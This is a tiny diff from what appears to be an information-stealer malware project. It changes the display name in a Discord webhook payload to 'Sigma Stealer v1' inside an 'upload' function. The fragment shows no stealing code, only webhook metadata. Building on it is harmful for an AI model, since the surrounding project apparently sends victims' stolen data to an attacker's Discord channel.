@@ -376,7 +376,7 @@ def upload(name, link):
                     }
                 }
             ],
-            "username": "Sigma",
+            "username": "Sigma Stealer v1",
             "avatar_url": " https://media.discordapp.net/attachments/1121397896256946199/1121603869017903175/ezgif-1-cd6290ab92.png",
             "attachments": []
             }
